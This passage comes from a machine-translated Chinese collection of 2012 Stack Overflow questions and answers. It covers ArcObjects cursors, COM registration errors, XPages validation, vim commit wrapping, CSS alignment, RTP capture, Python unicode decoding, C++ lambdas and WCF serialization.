            InitializeComponent();
        }

        public void ReadData()
            {

                //IMxDocument pMxDoc =  default(IMxDocument);
                 IMxDocument pMxDoc = ArcMapAddin1.ArcMap.Document;
                //IMap pMap = default(IMap);
                IMap pMap = pMxDoc.FocusMap;
                //IFeatureSelection pFLayer = default(IFeatureSelection);
            IFeatureLayer pLayer = pMap.get_Layer(0) as IFeatureLayer;    

            IFeatureSelection pFLayer = pLayer as IFeatureSelection;

            string stopHere2 = "";

                for (int Count = 0; Count <= pMap.LayerCount - 1; Count++) {

                    //if (pMap.LayerCount == "sde.GIS.parcels_adacounty")
                    if (pLayer.Name == "sde.GIS.parcels_adacounty")
                    {
                        //pFLayer = pMap.get_Layer(0)

                       //string thisString = pFLayer.SelectionSet.IDs.ToString();

                        IFeatureCursor pFCursor = null;

                        //pFLayer.SelectionSet.Search(null, false, pFCursor);

                        //IFeature pFLayer = pLayer(IFeature);

                        pFLayer = pFCursor.NextFeature;

                        if (pFLayer.SelectionSet.Count != 0) {
                            //lblParcel.Text = pF.Value.Fields.FindField("PARCEL");
                            //lblPrimaryOwner.Text =    pF.Value(pF.Fields.FindField("PRIMOWNER"));
                            //lblMailingAddress.Text = pF.Value(pF.Fields.FindField("ADDCONCAT"));
                            //lblPropertyAddress.Text = pF.Value(pF.Fields.FindField("ADDRESS"));
                        } else {
                            //if (sender == "Button")
                               // MessageBox.Show("Please select a Parcel.");
                        }

                        break; // TODO: might not be correct. Was : Exit For
                    }
                }

            }

        private void btnClose_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ReadData();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-08T14:22:49.683

`NextFeature`是一种`IFeature`在调用时返回的方法（请参阅[此处](http://edndoc.esri.com/arcobjects/9.0/ComponentHelp/esriGeoDatabase/IFeatureCursor_NextFeature.htm)的文档）。因此，您需要更改此设置：

```
pFLayer = pFCursor.NextFeature; 
```

对此：

```
pFLayer = pFCursor.NextFeature(); 
```

以便实际调用该函数。原始代码行基本上是采用函数指针并尝试将其强制转换为`IFunction`，因此出现错误。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-08T14:22:13.870

我认为您只需要添加`()`到`NextFeature`.

像这样：

```
pFLayer = pFCursor.NextFeature(); 
```

当然，`pFCursor`需要初始化为`null`first以外的东西，否则运行代码会崩溃。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-08T14:23:46.883

NextFeature 是一个必须用空括号调用它的方法：

```
pFLayer = pFCursor.NextFeature(); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-08T14:21:54.683

这部分永远不会起作用：

```
IFeatureCursor pFCursor = null;
pFLayer = pFCursor.NextFeature;   // pFCursor is sure to be null 
```

但这将是一个运行时错误。大概 NextFeature 是一个方法（函数），那么你需要：

```
IFeatureCursor pFCursor = ...     // something valid
pFLayer = pFCursor.NextFeature(); // always use () in a method call 
```

# .net - 检索 Com 类工厂错误

> ID：11866526
> 
> 赞同：0
> 
> 时间：2012-08-08T14:18:56.313
> 
> 标签：.net, vb.net, com

当我打开应用程序时，它抛出了以下错误，

函数错误：主要错误消息：检索具有 CLSID {XXXXXXXXXXXXXX-XXX-XXX-XXXXXX} 的组件的 COM 类工厂失败，原因是以下错误：80040154

在上面添加更多内容，该应用程序在 windows xp 中工作，但是当它移动到 windows 7 时，它抛出了上述错误。（我没有代码，这个应用程序在远程位置）

请提供您对此的宝贵意见，这可能是什么原因导致此错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:08:53.463

错误 80040154 表示未注册 COM 类。我不知道为什么它不会被注册；这通常由安装程序为您尝试创建的任何组件处理。

尝试使用 regsvr32.exe 注册 COM 组件（DLL 名称在命令行中传递）。

regsvr32 的一些文档在这里： [http ://technet.microsoft.com/en-us/library/bb490985.aspx](http://technet.microsoft.com/en-us/library/bb490985.aspx)

# xpages - 在关闭按钮上禁用验证

> ID：11866535
> 
> 赞同：1
> 
> 时间：2012-08-08T14:19:05.607
> 
> 标签：xpages

我有一个带有空验证字段的 xpage。

在表单上，​​我有一个关闭按钮，可以从 xpage 导航到视图 xpage。我想禁用，所以如果我点击关闭按钮，验证就不会运行。

我确实在按钮上将按钮属性禁用验证器设置为 true，但验证器和应用程序控件中的错误消息仍在显示。

任何想法如何使它工作？

服务器版本：Domino 8.5.3 UP1

演示问题的示例。单击按钮 1 验证器不应启动。按钮 2 验证器应显示“写一些东西...”

```
<?xml version="1.0" encoding="UTF-8"?> 
```

```
<xp:button value="close" id="button1" disableValidators="false">
    <xp:eventHandler event="onclick" submit="true"
        refreshMode="complete">
        <xp:this.action><![CDATA[#{javascript:sessionScope.test="dsf"}]]></xp:this.action>
    </xp:eventHandler>
</xp:button>
<xp:button value="Save" id="button2">
    <xp:eventHandler event="onclick" submit="true"
        refreshMode="complete">
        <xp:this.action><![CDATA[#{javascript:sessionScope.test="dsf"}]]></xp:this.action>
    </xp:eventHandler>
</xp:button>
<xp:br></xp:br>
<xp:br></xp:br>
<xp:inputText id="inputText1" required="true" rendered="true"
    disableClientSideValidation="true">

<xp:this.validators>
    <xp:validateRequired message="Write something.."></xp:validateRequired>
</xp:this.validators></xp:inputText>
<xp:message id="message1" for="inputText1"></xp:message> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:49:09.820

接缝是一个错误

```
<xp:button value="close" id="button1" disableValidators="false">
    <xp:eventHandler event="onclick" submit="true"
        refreshMode="complete" immediate="false" save="true" disableValidators="true">
        <xp:this.action><![CDATA[#{javascript:sessionScope.test="dsf"}]]></xp:this.action>
    </xp:eventHandler>
</xp:button> 
```

检查第一个和第二个 disableValidators="false" 当您通过按钮属性添加它时，第一个来自。这个没有效果。第二个来自检查事件选项卡上的“未经验证的过程数据”这个有效。

# git - 找不到在 MSysGit 中为提交消息 vi/vim 禁用换行的方法（默认情况下约为 74 个字符）

> ID：11866536
> 
> 赞同：2
> 
> 时间：2012-08-08T14:19:05.827
> 
> 标签：git, vim, vi

我过去曾尝试过几次（谷歌搜索和尝试）来禁用 MSysGit 中的 74 个小字符默认行/自动换行设置。我尝试浏览 msysgit 下的 vim 目录，我的 windows 用户目录进行设置，什么都没有。我找不到任何文档来禁用它。

我正在使用 1.7.11.msysgit.1

我如何完全关闭换行/自动换行，或者至少将它换行的字符增加到非常大的值。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-08T15:13:37.873

我认为你应该避免弄乱 Vim 的系统设置。如果您在没有管理员权限的 Linux/Unix 系统上尤其如此，并且这个问题对您来说也是一个问题（我在 Linux 上也遇到了同样的行为）。你应该修改你的 vimrc 文件。

要找出 vim 的 vimrc 文件在哪里，请在 vim 中发出`:version`命令并向下滚动，直到看到`user vimrc file:`. 就是这个。

修改它以仅更改文本宽度：

```
autocmd Syntax gitcommit setlocal textwidth=0 
```

这应该在第 74 个字符处禁用自动换行。您还可以使用以下命令删除所有自动命令：

```
autocmd! Syntax gitcommit 
```

要在删除它们之前查看实际命令是什么，请发出上述不带感叹号的命令。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:51:37.637

好的，我想通了。对于其他对此感兴趣的人，请编辑文件：[git]\share\vim\vimrc

在下面的行中，将 74 更改为您想要的宽度。它并不完美（如果你到达它们，它仍然会在设置的字符之后强制换行）但它至少在某种程度上是可定制的。也许删除它会更好。

autocmd 语法 gitcommit setlocal textwidth=74

# html - 列和内联元素，垂直对齐错误

> ID：11866548
> 
> 赞同：0
> 
> 时间：2012-08-08T14:19:35.663
> 
> 标签：html, css

我有 ul 的内联元素（复选框和跨度）

对于某些行（li's），我需要使用 float 尝试的两列，但这会破坏两列之间的垂直对齐，但是（！）当我为这个问题创建小提琴时，它适用于上述技术！：/

我什至将我们网站的完整样式剪切并粘贴到小提琴中，但我无法重现该问题

[http://jsfiddle.net/Q9g2C/](http://jsfiddle.net/Q9g2C/)

如您所见， **Bar1**和**Some info**是垂直对齐的。

如果我禁用 font-size: 0.85em; 从正文中，它也在我的网站上对齐，如果我在 CSS 中定义了大小，我使用 em 或 px 都没关系，它不会对齐。你们能告诉我有什么问题吗？

**编辑：**我的问题是什么可能导致跨度和输入在我的真实世界站点中不对齐（我无法在上面的小提琴中重现对齐问题）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:37:01.250

它是您的图像标签，它与您的 H1 标签顶部对齐。我刚刚删除了 "header" div 中的标签
[更正了 JS Fiddle Link](http://jsfiddle.net/Q9g2C/3/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:40:33.490

我对您的 jsfiddle 页面进行了一些编辑。

[http://jsfiddle.net/Q9g2C/4/](http://jsfiddle.net/Q9g2C/4/)

我学到的一个技巧是在所有有问题的东西周围加上一个简单的彩色边框，这样你就可以看到发生了什么。我没有完成所有事情，但这都是与 css 相关的。通过添加一些填充，它有助于将东西敲到应该去的地方。边框可帮助您查看被推到不对齐的内容。

继续玩css。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T15:01:34.900

必须简单地添加[this is in the normalize.css file of fiddle]

```
input{margin:0; padding:0;} 
```

The checkbox input must have some kind of offset that is showing on anything floated next to it.

# java - 捕获流

> ID：11866553
> 
> 赞同：1
> 
> 时间：2012-08-08T14:20:01.717
> 
> 标签：java, h.264, capture, rtp

我正在使用 Java，需要将音频/视频流保存到本地文件。

到目前为止，我设法发送了 RTSP 命令并保存了流。

但是，每个 RTP 包 (DynamicRTP-Type-96) 都包含一个标头和一个有效负载。有效负载包含一个 NAL 标头和实际的 NAL。

什么应该从这个入站流中实际保存到生成的视频文件中？

您知道可以解析每个数据包的 Java 库吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T06:42:43.507

数据包通常不会按原样制作可解码的流，无需修改（尤其是拆包）。相反，有效载荷具有一定的结构，由相应的文档或规范定义。典型的有效载荷是：

*   [RFC 6184 (3984) - H.264 视频的 RTP 有效负载格式](https://www.rfc-editor.org/rfc/rfc6184)
*   [RFC 6416 (3016) - MPEG-4 音频/视频流的 RTP 有效负载格式](https://www.rfc-editor.org/rfc/rfc6416)

检查早期的 Qs 可能会有所帮助，它们非常相关：

*   [H264 RTP包解析](https://stackoverflow.com/questions/2225688/h264-rtp-packet-parsing)
*   [为什么 RTP/RTSP 会干扰我的 H.264 NAL？](https://stackoverflow.com/questions/7580069/why-rtp-rtsp-meddle-with-my-h-264-nals)

# dll - IIS 7.5 ASP.OLD .NET4 类库 (dll) 未读取 .Config

> ID：11866556
> 
> 赞同：1
> 
> 时间：2012-08-08T14:20:14.863
> 
> 标签：dll, .net-4.0, asp-classic, iis-7.5

我从 IIS 7.5 上的 ASP.OLD（经典）页面调用 .NET4 类库。所有互操作都正常，通话正常。我的问题是，类库在调用时没有从 .config 文件中获取任何设置。

我在提供 ASP.OLD 文件的同一文件夹中有一个 we.config。我有一个 App.Config 来自注册类库的文件夹。

我什至尝试了 IIS 文件夹中的 app.config 文件和类库文件夹中的 web.config - 仍然没有乐趣。

IIS 应用程序池以经典管道模式运行。如果我在网站的 IIS 管理器中打开应用程序设置，值就在那里。

我应该把 .config 文件放在哪里以及应该叫什么？

塔！ñ

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T19:59:37.293

问题是通过 COM 互操作从 ASP 调用 .NET dll 会将 .NET dll 加载到默认的 AppDomain 中。.NET dll 不会像加载到 ASP.NET 应用程序域的 dll 那样知道 ASP.NET、web.configs、当前 IIS 请求等。就好像它只是由一些正在运行的 exe 加载的，实际上就是这样。

您的 dll 将有权访问的配置信息将是 w3wp.exe 的配置文件。因此，在您的 dll 中获取此配置信息的一种方法（尽管您知道我实际上并不推荐这种方法）是将文件添加到`w3wp.exe.config`文件`windows\system32\inetsrv`夹中。这当然是一件可怕的事情，你不应该这样做。

我实际上要做的是创建一个 COM 可见类，它的工作是公开一些代表各种配置设置的属性。属性设置器会将值分配到 dll 的静态空间中。然后在 ASP 应用程序的 Global.asa 文件中的 Application start 事件中添加一些代码来实例化此对象并分配配置值。

dll 将在内部引用由上述代码设置的静态值。

请注意，在同一应用程序池中运行的所有 ASP 应用程序都需要具有相同的配置，因为它们将共享相同的应用程序域。这比在同一台机器上的所有 ASP 应用程序最终共享一个公共配置的其他方法要好。

# javascript - Brightcove 视频云的 Javascript

> ID：11866561
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:20:29.580
> 
> 标签：javascript, html5-video, dom-events, brightcove

我可以播放获取警报以进行工作`myTemplateLoaded`并让第一个视频开始工作，但之后它不会进入下一个视频......请有更多经验的人加入吗？我将不胜感激！

```
<!-- Start of Brightcove Player -->
<div style="display:none"> </div>
<script language="JavaScript" type="text/javascript" src="http://admin.brightcove.com/js/BrightcoveExperiences.js"></script>
<object id="myExperience1116920512001" class="BrightcoveExperience" >
<param name="bgcolor" value="#FFFFFF" />
<param name="width" value="480" />
<param name="height" value="270" />
<param name="playerID" value="1186083953001" />
<param name="playerKey" value="AQ~~,AAAAwFCyREk~,R6fcmQA_ySLOTNBFvZ0mjvLcTW-_NNbL" />
<param name="isVid" value="true" />
<param name="isUI" value="true" />
<param name="dynamicStreaming" value="true" />
<param name="@videoPlayer" value="ref:spring" />
<param name="includeAPI" value="true" />
<param name="templateLoadHandler" value="myTemplateLoaded" />
</object>

<!-- End of Brightcove Player -->

<script type="text/javascript">
var player;
var modVP;
var modExp;
var modCon;
var previousVideoID=0;
var nextVideo=0;
var videos=new Array(1772963843001,1765076426001,17490792490011);
function myTemplateLoaded(experienceID) {
// alert(experienceID);
player = brightcove.api.getExperience(experienceID);
modVP = player.getModule(brightcove.api.modules.APIModules.VIDEO_PLAYER);
modExp = player.getModule(brightcove.api.modules.APIModules.EXPERIENCE);
modCon = player.getModule(brightcove.api.modules.APIModules.CONTENT);
modVP.loadVideoByID(videos[nextVideo]);
modExp.addEventListener(brightcove.api.events.ExperienceEvent.TEMPLATE_READY, onTemplateReady);
}

function onTemplateReady(evt) {
modVP.addEventListener(brightcove.api.events.MediaEvent.COMPLETE, onMediaComplete);
modVP.addEventListener(brightcove.api.events.MediaEvent.CHANGE, onMediaChange);
}

function onMediaComplete() {
nextVideo++;
if (nextVideo==videos.length) {
nextVideo=0;
}
modVP.loadVideoByID(videos[nextVideo]);
}

function getCurrentVideoCallback(currentVideo) {
document.getElementById("currentVideoInfo").innerHTML = "Video named '" + currentVideo.displayName + "' loaded. Video ID: " + currentVideo.id;
}

function onMediaChange(evt) {
document.getElementById("mediaInfo").innerHTML = "NOW PLAYING: " + evt.media.displayName;
}
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-08T21:45:58.070

您还可以在 Brightcove 内部的播放器界面中调整设置。您可以在播放器设置中选择在第一个视频加载完成后开始下一个视频，然后只需输入嵌入代码。

[http://support.brightcove.com/en/video-cloud/training-videos/setting-playlists-auto-advance](http://support.brightcove.com/en/video-cloud/training-videos/setting-playlists-auto-advance)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-01T14:49:06.993

您还可以在 Mac 上使用 MAMP 在本地测试您的页面。只需确保将 HTML 文件保存到 MAMP Preferences 的“Apache”选项卡中指定为 Document Root 的文件夹中。您还应该在“端口”选项卡中“设置为默认的 Apache 和 MySQL 端口”。

[http://www.mamp.info/en/index.html](http://www.mamp.info/en/index.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-09T11:43:27.763

如果从文件系统本地运行，Brightcove API 将无法工作。从 Web 服务器运行代码，就像您在使用 jsfiddle 时所做的那样。

# python - 如何在 Python 2.7 中一次解码 unicode 一行？

> ID：11866566
> 
> 赞同：5
> 
> 时间：2012-08-08T14:20:38.843
> 
> 标签：python, python-2.7, file-io, unicode, generator

从 Python 2.7 加载 unicode 文本的正确方法是：

```
content = open('filename').read().decode('encoding'):
for line in content.splitlines():
    process(line) 
```

（**更新**：不，不是。请参阅答案。）

但是，如果文件非常大，我可能想一次读取、解码和处理一行，这样整个文件就不会一次加载到内存中。就像是：

```
for line in open('filename'):
    process(line.decode('encoding')) 
```

循环在打开的文件句柄上的`for`迭代是一个一次读取一行的生成器。

但这不起作用，因为例如，如果文件是 utf32 编码的，那么文件中的字节（十六进制）看起来像：

```
hello\n = 68000000(h) 65000000(e) 6c000000(l) 6c000000(l) 6f000000(o) 0a000000(\n) 
```

`for`并且由循环完成的分割成行分割字符的`0a`字节`\n`，导致（以十六进制表示）：

```
lines[0] = 0x 68000000 65000000 6c000000 6c000000 6f000000 0a
lines[1] = 0x 000000 
```

因此，部分`\n`字符留在第 1 行的末尾，其余三个字节在第 2 行结束（后面是实际在第 2 行中的任何文本。）`decode`可以理解的是，调用这些行中的任何一行都会导致`UnicodeDecodeError`.

```
UnicodeDecodeError: 'utf32' codec can't decode byte 0x0a in position 24: truncated data 
```

因此，很明显，将 unicode 字节流拆分为`0a`字节并不是将其拆分为行的正确方法。相反，我应该在出现完整的四字节换行符 (0x0a000000) 时进行拆分。但是，我认为检测这些字符的正确方法是将字节流解码为 un​​icode 字符串并查找`\n`字符——而这种对完整流的解码正是我试图避免的操作。

这不能是一个不常见的要求。正确的处理方法是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-08T14:27:27.140

试试类似的东西怎么样：

```
for line in codecs.open("filename", "rt", "utf32"):
    print line 
```

我认为这应该有效。

该`codecs`模块应该为您进行翻译。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-08T14:26:45.063

尝试使用编解码器模块：

```
for line in codecs.open(filename, encoding='utf32'):
    do_something(line) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:27:27.657

使用 codecs.open 而不是内置打开：

```
import codecs
for line in codecs.open('filename', encoding='encoding'):
    print repr(line) 
```

[http://docs.python.org/library/codecs.html#codecs.open](http://docs.python.org/library/codecs.html#codecs.open)

当然，我在完成我精心设计的 stackoverflow 问题后不久就发现了这一点。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-10-14T02:36:26.540

[`codecs.open`本身指出这`io.open`是一个更好的选择](https://docs.python.org/3/library/codecs.html#codecs.open)（注意就在链接目标上方）。它没有被弃用，只是因为它支持一些深奥的用途（字节->字节编解码器）。

[`io.open`在 Python 2.6 及更高版本中可用](https://docs.python.org/2/library/io.html#io.open)，并提供与 Py3 的 built-in 相同的行为`open`，进行了更好的优化，并且不会`codecs.open`像行尾转换之类的东西那样行为不端。使用的唯一原因`codecs.open`是如果您需要支持 Python 2.5 及更早版本，否则`io.open`会更好。

```
import io

# Use with statement for guaranteed, predictable cleanup
with io.open('filename', encoding='utf-32') as f:
    for line in f:
        process(line) 
```

顺便说一句，您可以使用 将*任何*已经打开的二进制类文件对象转换为基于文本的无缝解码对象[，`io.TextIOWrapper`](https://docs.python.org/2/library/io.html#io.TextIOWrapper)因此如果其他人以二进制模式为您提供现有的类文件对象，您仍然可以通过以下方式隐式逐行解码：

```
def process_file(f):
    if 'b' in f.mode:  # Or some better test...
        f = io.TextIOWrapper(f, encoding='utf-32')
    for line in f:
        process(line) 
```

# javascript - HTML5 中的不同数据格式

> ID：11866569
> 
> 赞同：0
> 
> 时间：2012-08-08T14:20:43.750
> 
> 标签：javascript, html

我被分配了一项任务，我必须在当前项目中进行一些修改。作业内容如下：

> 编写一个示例，它使用 data-format 属性来请求另一种形式的数据（例如：图像的二进制数据字符串）。供您参考，现在在 html 文件上：
> 
> ```
> data-format="canvas" uses will return data adapted to canvas if it is available
> data-format="binary" uses will return binary  data if available
> data-format="canvas,binary" uses will return data adapted to canvas if it is available, or binary data otherwise. 
> ```

我不明白二进制部分。为什么有人想要图像的二进制数据字符串？增加灵活性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:23:05.013

在这种情况下，“二进制”表示“不是文本”。大多数图像格式不是基于文本的（SVG 是一个明显的例外）。

# c++ - C++ 闭包语法错误

> ID：11866573
> 
> 赞同：2
> 
> 时间：2012-08-08T14:21:04.967
> 
> 标签：c++, c++11, lambda, closures

这里的语法有什么问题？我关注[这个](http://candrews.net/blog/2011/07/understanding-c-0x-lambda-functions/)资源。

```
char x = 'a', y = 'a';

[&x,=y]() { // error: expected identifier before '=' token
  ++x; ++y; // error: 'y' is not captured
}(); 
```

我使用 MinGW g++ 4.5.2 命令行编译器`-std=c++0x`

**澄清**：我想`y`通过价值。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:43:10.447

```
char x = 'a', y = 'a';

[&x,y]() mutable{
  ++x; ++y;
}(); 
```

[活生生的例子。](http://liveworkspace.org/code/f2b27f8a17fb1d37f50ab5fca844cca2)

是正确的代码。要捕获变量按值，只需写下它的名称。为了允许修改按值捕获，lambda 需要被标记`mutable`，否则`operator()`被标记`const`。

`§5.1.2 [expr.prim.lambda] p5`

> `const`[...]当且仅当*lambda-expression*的*parameter-declaration-clause*后面没有**mutable**时，才声明此函数调用运算符（9.3.1） 。[...]

# google-apps-script - setMatchType(Charts.MatchType.ANY) 不起作用？创建我的过滤器以在谷歌网站上显示电子表格数据

> ID：11866574
> 
> 赞同：0
> 
> 时间：2012-08-08T14:21:18.197
> 
> 标签：google-apps-script

**嗨，首先抱歉我的英语不好，我希望你能理解我的问题，我想在谷歌网站上显示电子表格中的数据。实际上，我将电子表格中的数据放在“newDataTable”中，效果很好。**

```
 var docOrganismesPubliques =     SpreadsheetApp.openById("XXXXXXXSpreadsheetKeyXXXXXXX"); // key du document : "OpenData Organisme Public"    
  var docOpenDataEnFrance = SpreadsheetApp.openById("XXXXXXXSpreadsheetKeyXXXXXXX"); // key du document : "OpenData en France"

  var docs = new Array();
  docs[0] = docOpenDataEnFrance;
  docs[1] = docOrganismesPubliques;

  var enTetesCrees = false;
  for(var m=0; m <docs.length; m++) { 
  var sheetsTotalParDoc = docs[m].getSheets();

  if (!enTetesCrees) {

      var rowHeadSheet = sheetsTotalParDoc[0];
      var rows = rowHeadSheet.getRange("A1:L1");
      var valuesRowHead = rows.getValues();

      var rowHead = valuesRowHead[0];              

      data = Charts.newDataTable()
          .addColumn(Charts.ColumnType.STRING, rowHead[0])
          //.addColumn(Charts.ColumnType.STRING, rowHead[1])
          .addColumn(Charts.ColumnType.STRING, rowHead[2])
          .addColumn(Charts.ColumnType.STRING, rowHead[3])
          .addColumn(Charts.ColumnType.STRING, rowHead[4])
          //.addColumn(Charts.ColumnType.STRING, rowHead[5])
          .addColumn(Charts.ColumnType.STRING, rowHead[6])
          //.addColumn(Charts.ColumnType.STRING, rowHead[7])
          //.addColumn(Charts.ColumnType.STRING, rowHead[8])
          .addColumn(Charts.ColumnType.STRING, rowHead[9])
          .addColumn(Charts.ColumnType.STRING, rowHead[10])
          .addColumn(Charts.ColumnType.STRING, rowHead[11])

          enTetesCrees = true;
      /*********************************
      * Fin création en-têtes (colonnes)
      **********************************
      */
    }

  for(var k = 0; k < sheetsTotalParDoc.length; k++) {    

      var sheet = sheetsTotalParDoc[k];   
      var rows = sheet.getDataRange(); //.getRange("A1:L5")
      var numRows = rows.getNumRows();
      var values = rows.getValues();     
    //on commence par la deuxième ligne car la première correspond à l'en-tête
      for (var i = 1; i <= numRows - 1; i++) {
        var valuesRow = values[i];

        var rowTraitee = new Array();
        rowTraitee[0] = valuesRow[0];
        rowTraitee[1] = valuesRow[2];
        rowTraitee[2] = valuesRow[3];
        rowTraitee[3] = valuesRow[4];
        rowTraitee[4] = valuesRow[6];
        rowTraitee[5] = valuesRow[9];
        rowTraitee[6] = valuesRow[10];
        rowTraitee[7] = valuesRow[11];

        data.addRow([rowTraitee[0],rowTraitee[1],rowTraitee[2],rowTraitee[3],rowTraitee[4],rowTraitee[5],rowTraitee[6],rowTraitee[7]]);

      }
  } //fin "for" qui parcours chaque feuille d'un spreadsheet

} //fin "for" qui parcours chaque document spreadsheet

  data.build(); 
```

**然后我尝试使用 GAS 过滤器按类别过滤列：**

```
 var themeFilter = Charts.newStringFilter()
  .setFilterColumnIndex(5)
  .setMatchType(Charts.MatchType.ANY)
 .setCaseSensitive(true)
  .build(); 
```

**但是，有一个问题，setMatchType(Charts.MatchType.ANY) 不起作用，我不知道为什么.. 它在 java 脚本选项上运行良好：“matchType”：'any'（我可以在 gs 上使用 js 吗？）所以我决定使用 clickhanlder 函数构建我自己的过滤器，其中包含不同类别的复选框，以在我刚刚创建的数据表中查找（“字符串”）。我的问题是，我不知道**如何从其他函数访问 dataTable 的数据（clickhandler-chekbox）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-10T18:34:58.573

我能够复制这个问题，它[似乎是一个错误](https://stackoverflow.com/a/11905864/702875)。请在[问题跟踪器](http://code.google.com/p/google-apps-script-issues/issues/list)上提交问题以获取更新。

# .net - WCF 连接因复杂数据而关闭

> ID：11866577
> 
> 赞同：2
> 
> 时间：2012-08-08T14:21:20.620
> 
> 标签：.net, wcf, datacontract, operationcontract

我有一个 WCF 服务，在这个服务中我返回一个包含很多属性的类，其中一些属性本身就是类，它有点复杂但不是很大。我用另一个 WCF 服务在同一个项目上做了类似的事情，一切都很好。但是这个在我使用时给了我这个错误。

```
[System.ServiceModel.CommunicationException]    {"An error occurred while receiving the HTTP response to http://xxx/Service.svc. This could be due to the service endpoint binding not using the HTTP protocol. This could also be due to an HTTP request context being aborted by the server (possibly due to the service shutting down). See server logs for more details."}  System.ServiceModel.CommunicationException 
```

内部异常是

```
[System.Net.WebException]   {"The underlying connection was closed: An unexpected error occurred on a receive."}    System.Net.WebException 
```

内在的例外说

```
[System.IO.IOException] {"Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."}   System.IO.IOException 
```

内在的例外说

```
[System.Net.Sockets.SocketException]    {"An existing connection was forcibly closed by the remote host"}   System.Net.Sockets.SocketException 
```

所以，这就是我尝试过的。我以为我的 .svc 文件中可能有一些错误，或者我的 .config 文件的配置中可能有一些错误，但据我所知没有。然后，我想我应该尝试看看我是否可以从服务器向客户端发送一个简单的类型。因此，我创建了一个名为 GetInt() 的方法，它返回 7。我在客户端上调用了它，它运行良好。因此，我认为这是我从服务器发回的数据不受支持。我不明白为什么，因为正如我所说，我之前在同一个项目上（就在昨天）发送了复杂类型，并且一切正常。无论如何，这是我要发送的课程。也许，有人可以指出可能不支持的内容。或者也许有人知道还有什么可能导致这种情况。

```
 public class Hotels
    {
        public string Language { get; set; }
        public string Datum { get; set; }
        public  List<HotelListing> HotelListing { get; set; }
    }

    public class HotelListing
    {
        public long Id { get; set; }
        public string Name { get; set; }
        public string Country { get; set; }
        public decimal Latitude { get; set; }
        public decimal Longitude { get; set; }
        public string Category { get; set; }
        public List<PhoneNumber> PhoneNumbers { get; set; }
        public Address Address { get; set; }
        public Content Content { get; set; }
    }

    public class Content
    {
        public Description Description { get; set; }
        public List<Review> Reviews { get; set; }
        public Image Image { get; set; }
        public AtrttributeData AtrttributeData { get; set; }
    }

    public class AtrttributeData
    {
        public string Link { get; set; }
        public string Title { get; set; }
        public NameValueCollection Attributes { get; set; }
    }

    public class Image
    {
        public string Type { get; set; }
        public string ImageURL { get; set; }
        public string HotelURL { get; set; }
    }

    public class Review
    {
        public string Type { get; set; }
        public string Link { get; set; }
        public string Author { get; set; }
        public string Body { get; set; }
        public NameValueCollection Ratings { get; set; } 
    }

    public class Description
    {
        public string Link { get; set; }
        public string Title { get; set; }
        public string Body { get; set; }
    }

    public class Address
    {
        public string Format { get; set; }
        public string Addr1 { get; set; }
        public string Addr2 { get; set; }
        public string City { get; set; }
        public string PostCode { get; set; }
    }

    public class PhoneNumber
    {
        public string Type { get; set; }
        public string Number { get; set; }
    } 
```

有问题的方法是这样的

```
[OperationContract]
Hotels GetHotels(); 
```

任何帮助将不胜感激。

这是我的配置部分

```
<binding name="BasicHttpBinding_ITablet" closeTimeout="00:01:00"
                    openTimeout="00:01:00" receiveTimeout="00:10:00" sendTimeout="00:01:00"
                    allowCookies="false" bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard"
                    maxBufferSize="65536" maxBufferPoolSize="524288" maxReceivedMessageSize="65536"
                    messageEncoding="Text" textEncoding="utf-8" transferMode="Buffered"
                    useDefaultWebProxy="true">
                    <readerQuotas maxDepth="32" maxStringContentLength="8192" maxArrayLength="16384"
                        maxBytesPerRead="4096" maxNameTableCharCount="16384" />
                    <security mode="None">
                        <transport clientCredentialType="None" proxyCredentialType="None"
                            realm="" />
                        <message clientCredentialType="UserName" algorithmSuite="Default" />
                    </security>
                </binding>

<snip>

<endpoint address="http://xxx/Service.svc"
                binding="basicHttpBinding" bindingConfiguration="BasicHttpBinding_ITablet"
                contract="SupplierInterfaceTabletService.ITablet" name="BasicHttpBinding_ITablet" /> 
```

谢谢，

萨钦

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:29:23.367

尝试返回 DataContract（不是 Class）。这是一个带有另一个 DataContract 列表和继承示例的 DataContract。

```
[DataContract]
public class sDoc
{
    [DataMember]
    public int sID;
    [DataMember]
    public int sParID;
    [DataMember]
    public List<sDocProp> Props;
    [DataMember]
    public string SessionID;

    public string NotDataMember;
}

[DataContract]
[KnownType(typeof(sDocPropStringSV))]
public class sDocProp
{
    [DataMember]
    public int ID;
    [DataMember]
    public string Name;
    [DataMember]
    public ArrivalStatus ArrivalStatus;
}

[DataContract]
public class sDocPropStringSV : sDocProp
{
    [DataMember]
    public string Value;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T15:03:33.793

我喜欢.NET，它有时太垃圾了。问题是 NameValueCollections。由于某种原因，WCF 在将这些从服务器传递到客户端时遇到了问题。去搞清楚！

# objective-c - 在uitableview单元格中标记和取消标记框

